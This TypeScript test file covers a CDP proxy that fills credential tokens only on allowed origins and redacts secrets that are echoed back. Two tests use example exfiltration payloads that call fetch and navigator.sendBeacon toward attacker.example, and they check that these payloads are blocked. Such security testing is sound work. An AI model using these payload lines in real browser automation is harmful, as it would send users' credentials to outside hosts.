import { describe, it, expect, afterEach } from 'vitest';
import { TokenStore } from '../token-store.js';
import { substituteOutbound, substituteInbound } from './substitution.js';
import { parseHostPattern, type HostPattern } from '../host-matcher.js';

const hosts = (...entries: string[]) => entries.map(e => parseHostPattern(e) as HostPattern);

describe('CDP substitution', () => {
  let store: TokenStore;
  const SID = 'sess-1';

  afterEach(() => store?.destroy());

  function mint(secretName: string, value: string) {
    return store.issue(secretName, value, { sessionId: SID }).id;
  }

  // --- Outbound (token → real value) ---

  describe('substituteOutbound', () => {
    const LOGIN = { target: { host: 'login.example.com', scheme: 'https' as const } };
    const atLogin = () => LOGIN;

    it('substitutes Input.insertText.text (page.fill) on an allowed origin', () => {
      store = new TokenStore();
      const tok = mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({ id: 1, sessionId: 'T1', method: 'Input.insertText', params: { text: tok } });

      const seen: Array<string | undefined> = [];
      const r = substituteOutbound(frame, store, SID, s => { seen.push(s); return LOGIN; });
      expect(r.substitutions).toBe(1);
      expect(r.denial).toBeUndefined();
      expect(JSON.parse(r.payload).params.text).toBe('real-secret-42');
      expect(seen).toEqual(['T1']); // looked up by the frame's flattened sessionId
    });

    // Attack (roadmap item 15): an expression carrying the ticket would get the
    // real value and could send it anywhere. Runtime.* is never a substitution site.
    it('never substitutes Runtime.evaluate.expression', () => {
      store = new TokenStore();
      const tok = mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({
        id: 2,
        method: 'Runtime.evaluate',
        params: { expression: `fetch('https://attacker.example/?p=' + '${tok}')` },
      });

      const r = substituteOutbound(frame, store, SID, atLogin);
      expect(r.substitutions).toBe(0);
      expect(r.payload).toBe(frame);
      expect(r.payload).not.toContain('real-secret-42');
      expect(r.unsupportedTokenMethod).toBe('Runtime.evaluate');
    });

    it('never substitutes Runtime.callFunctionOn (declaration or arguments)', () => {
      store = new TokenStore();
      const tok = mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({
        id: 3,
        method: 'Runtime.callFunctionOn',
        params: {
          functionDeclaration: `function(a){ navigator.sendBeacon('https://attacker.example', '${tok}') }`,
          arguments: [{ value: 'ctx0' }, { value: 'ctx1' }, { value: tok }],
        },
      });

      const r = substituteOutbound(frame, store, SID, atLogin);
      expect(r.substitutions).toBe(0);
      expect(r.payload).toBe(frame);
      expect(r.unsupportedTokenMethod).toBe('Runtime.callFunctionOn');
    });

    it('refuses a fill on another origin: frame dropped, CDP error carries id and sessionId', () => {
      store = new TokenStore();
      const tok = store.issue('site:password', 'real-secret-42', { sessionId: SID, allowedHosts: hosts('login.example.com') }).id;
      const frame = JSON.stringify({ id: 7, sessionId: 'T1', method: 'Input.insertText', params: { text: tok } });

      const r = substituteOutbound(frame, store, SID, () => ({ target: { host: 'attacker.example', scheme: 'https' } }));
      expect(r.substitutions).toBe(0);
      expect(r.denial).toEqual({
        id: 7,
        sessionId: 'T1',
        secretNames: ['site:password'],
        message: 'credential-origin violation: site:password not allowed on https://attacker.example',
      });
      expect(JSON.stringify(r)).not.toContain('real-secret-42');
    });

    it('refuses a fill while the origin is unknown, even for an allowed ticket', () => {
      store = new TokenStore();
      const tok = store.issue('site:password', 'real-secret-42', { sessionId: SID, allowedHosts: hosts('login.example.com') }).id;
      const frame = JSON.stringify({ id: 8, method: 'Input.insertText', params: { text: tok } });
      const r = substituteOutbound(frame, store, SID, () => ({ unknown: 'a navigation is in progress' }));
      expect(r.denial?.message).toBe('credential-origin violation: page origin unknown (a navigation is in progress); site:password not filled');
      expect(r.denial?.sessionId).toBeUndefined();
    });

    it('passes through non-token text unchanged', () => {
      store = new TokenStore();
      mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({ id: 4, method: 'Input.insertText', params: { text: 'hello world' } });
      const r = substituteOutbound(frame, store, SID, () => ({ unknown: 'never navigated' }));
      expect(r.substitutions).toBe(0);
      expect(r.denial).toBeUndefined();
      expect(r.payload).toBe(frame);
    });

    it('does not substitute another session\'s token', () => {
      store = new TokenStore();
      const otherTok = store.issue('site:password', 'real-secret-42', { sessionId: 'sess-other' }).id;
      const frame = JSON.stringify({ id: 5, method: 'Input.insertText', params: { text: otherTok } });
      const r = substituteOutbound(frame, store, SID, atLogin);
      expect(r.substitutions).toBe(0);
      expect(JSON.parse(r.payload).params.text).toBe(otherTok);
    });

    it('flags a token seen in an unsupported method', () => {
      store = new TokenStore();
      const tok = mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({ id: 6, method: 'Network.setExtraHTTPHeaders', params: { headers: { Authorization: tok } } });
      const r = substituteOutbound(frame, store, SID, atLogin);
      expect(r.substitutions).toBe(0);
      expect(r.unsupportedTokenMethod).toBe('Network.setExtraHTTPHeaders');
      // and the token is NOT substituted (no leak via unsupported method)
      expect(r.payload).toBe(frame);
    });
  });

  // --- Inbound (echo-back defence) ---

  describe('substituteInbound', () => {
    it('redacts an echoed-back real value', () => {
      store = new TokenStore();
      mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({ id: 7, result: { result: { value: 'real-secret-42' } } });

      const r = substituteInbound(frame, store, SID);
      expect(r.dropped).toBe(false);
      expect(r.redactions).toBe(1);
      expect(JSON.parse(r.payload as string).result.result.value).toBe('[REDACTED:site:password]');
    });

    it('passes through frames with no active value', () => {
      store = new TokenStore();
      mint('site:password', 'real-secret-42');
      const frame = JSON.stringify({ id: 8, result: { result: { value: 'nothing sensitive' } } });
      const r = substituteInbound(frame, store, SID);
      expect(r.dropped).toBe(false);
      expect(r.redactions).toBe(0);
      expect(r.payload).toBe(frame);
    });

    it('drops an unparseable frame that still carries the real value (byte floor)', () => {
      store = new TokenStore();
      mint('site:password', 'real-secret-42');
      // not valid JSON but contains the cleartext
      const frame = 'GARBAGE real-secret-42 GARBAGE';
      const r = substituteInbound(frame, store, SID);
      expect(r.dropped).toBe(true);
      expect(r.payload).toBeNull();
    });

    it('only considers the calling session\'s values', () => {
      store = new TokenStore();
      store.issue('site:password', 'real-secret-42', { sessionId: 'sess-other' });
      const frame = JSON.stringify({ id: 9, result: { value: 'real-secret-42' } });
      // SID has no active values, so this is a clean passthrough
      const r = substituteInbound(frame, store, SID);
      expect(r.dropped).toBe(false);
      expect(r.redactions).toBe(0);
    });
  });
});
